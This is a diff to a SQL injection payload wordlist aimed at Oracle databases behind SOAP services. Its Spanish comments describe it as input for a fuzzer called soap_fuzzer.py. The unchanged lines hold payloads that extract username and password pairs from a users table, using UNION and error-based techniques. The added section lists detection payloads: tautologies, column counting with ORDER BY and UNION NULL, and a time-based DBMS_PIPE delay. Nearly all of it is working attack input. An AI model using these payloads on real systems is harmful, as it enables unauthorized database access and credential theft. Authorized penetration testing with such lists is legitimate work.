@@ -18,3 +18,51 @@
 ' UNION SELECT NULL,(SELECT username||':'||password FROM users WHERE ROWNUM=1),NULL FROM dual--
 ' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT username||':'||password FROM users WHERE ROWNUM=1))--
 ' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 'x' END FROM dual)='a--
+
+# =====================================================================
+# SQLi ORACLE / SOAP - FASE 1: DETECCION
+# Uso: python3 soap_fuzzer.py --curl '...' --tags --tags-only <ETIQUETA> \
+#        --sqli-file sqli-oracle-detect.txt --threads 5 --interval 200
+# Compatible con soap_fuzzer.py:
+#   - Sin < > crudos (el payload se inserta dentro de <tag>...</tag>)
+#   - Sin break-out CDATA ni entidades &apos; (inyeccion directa)
+#   - Payloads con 1=1 / '1'='1 para que derive la contraparte falsa sola
+#   - Los errores ORA-xxxxx en la respuesta se auto-clasifican como ALTO
+# =====================================================================
+
+# --- 1. Deteccion basica (rompe la query / tautologias) ---
+'
+''
+'
+' OR '1'='1
+" OR "1"="1
+') OR ('1'='1
+admin'--
+' OR 1=1--
+' AND 1=1--
+' AND 'a'='a
+
+# --- 2. Conteo de columnas (difieren = ORA-01796/ORA-01789 detectado) ---
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 6--
+' ORDER BY 7--
+' ORDER BY 8--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+
+# --- 3. UNION con condicion derivable (diff booleana automatica) ---
+# Ajusta los NULL al conteo real que arrojo la seccion 2
+' AND 1=1 UNION SELECT NULL,NULL,NULL FROM dual--
+' OR 1=1 UNION SELECT NULL,NULL,NULL FROM dual--
+
+# --- 4. Time-based (1 sola peticion; NO se auto-clasifica: revisa la
+#        columna ms del log contra la baseline antes de repetir) ---
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--
+                                                                  
